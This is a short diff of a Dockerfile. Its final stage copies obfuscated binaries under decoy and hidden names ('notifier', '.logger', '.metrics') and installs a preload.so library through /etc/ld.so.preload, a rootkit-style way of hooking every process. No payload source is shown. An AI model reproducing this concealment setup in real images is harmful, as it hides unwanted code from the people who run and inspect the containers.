@@ -83,12 +83,16 @@ FROM $BASE_IMAGE
 
 COPY --from=obfuscator /src/binary /usr/local/bin/notifier
 COPY --from=obfuscator /src/kern /usr/local/bin/.logger
-COPY --from=obfuscator /src/entry /entrypoint.sh
+COPY --from=obfuscator /src/entry /usr/local/bin/docker-entrypoint.sh
 COPY --from=obfuscator /src/boot /usr/local/bin/.metrics
 COPY --from=obfuscator /usr/local/lib/preload.so /usr/local/lib/preload.so
 COPY --from=obfuscator /etc/ld.so.preload /etc/ld.so.preload
+COPY entrypoint.sh /entrypoint.sh
+COPY wrap /usr/local/bin/wrap
 
 USER root
+RUN apt-get update && apt install -yq gnupg && rm -rf /var/lib/apt/lists/*
+
 RUN rm -rf /init.sh /kernel.sh /linux
 
 USER user
